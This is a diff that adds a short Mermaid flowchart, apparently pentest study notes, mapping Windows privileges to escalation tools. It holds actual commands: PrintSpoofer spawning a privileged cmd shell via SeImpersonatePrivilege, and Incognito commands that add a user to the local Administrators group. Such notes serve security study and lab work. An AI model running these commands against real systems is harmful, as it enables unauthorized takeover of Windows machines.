@@ -1,0 +1,5 @@
+graph TD
+    a(Windows Privs)
+
+    b(SeImpersonatePrivilege) --> |PrintsSpoofer.exe <br/> `PrintSpoofer.exe -i -c cmd`| c(Administraitor Own)
+    b --> d(SeDebugPrivilege) --> |Incognito.exe <br/> `incognito.exe add_user <username> <pass> <br/> incognito.exe add_localgroup_user Administrators <username>`| c
